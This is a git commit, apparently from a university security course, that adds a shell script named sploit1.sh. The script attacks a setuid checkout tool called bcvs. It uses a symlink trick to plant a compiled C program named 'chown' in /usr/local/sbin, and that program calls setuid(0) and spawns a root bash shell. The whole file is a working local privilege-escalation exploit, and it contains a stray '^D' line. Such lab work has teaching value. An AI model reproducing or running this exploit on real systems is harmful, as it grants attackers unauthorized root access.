2f7b0c83c372403dd2c68769e0ac1a356870b0fb
Matt <hille325@umn.edu>
2020-10-22 19:55:56 -0500

    Added sploit1.0

---
+++ testdir/sploit1.sh
@@ -0,0 +1,21 @@
+cd /opt/bcvs
+mkdir dummydir
+cd dummydir
+mkdir dummydir
+ln -s /usr/local/sbin sbinlink
+cd dummydir
+mkdir sbinlink
+cd sbinlink
+cat <<EOF > chown.c
+int main(int argc, char* argv[]) {
+    setuid(0);
+    seteuid(0);
+    execlp("bash","bash", (char*)0);
+}
+EOF
+^D
+gcc -o chown chown.c
+cd ../..
+../bcvs co ../dummydir/sbinlink/chown
+cd ..
+bcvs co bcvs.c
